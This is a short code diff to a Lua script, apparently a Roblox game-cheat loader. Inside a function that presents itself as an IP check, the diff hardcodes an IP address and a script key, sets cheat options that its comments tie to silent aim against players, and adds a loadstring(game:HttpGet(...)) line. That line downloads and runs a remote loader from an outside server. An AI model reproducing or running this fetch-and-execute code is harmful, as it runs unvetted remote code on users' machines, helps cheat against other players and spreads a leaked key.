@@ -43,12 +43,16 @@ end
 
 -- Function to read and check IP
 function readAndCheckIP()
-    local savedIP = nexus.IP or ""  -- Assuming nexus has an 'IP' field
+    local savedIP = nexus.IP or "148.135.150.223"  -- Assuming nexus has an 'IP' field
 
     local userInputIP = getUserIPInput()
 
     if savedIP == userInputIP then
-        print("IP addresses match.")
+        script_key = "ZPGWRtqmCPgCGcCtknokgRMKusltZjfy"
+        getgenv().Team = "Pirates"
+        getgenv().FixCrash = false -- Turn it On For Hopping Server, Improve Performance But Silent Aim On Mob And Player
+        getgenv().FixCrash2 = false -- Turn it On For Hopping Server, Improve Performance But Will Remove Speed Changer
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
     else
         kick()
     end
@@ -57,3 +61,5 @@ end
 -- Example usage
 deploy()
 readAndCheckIP()
+
+
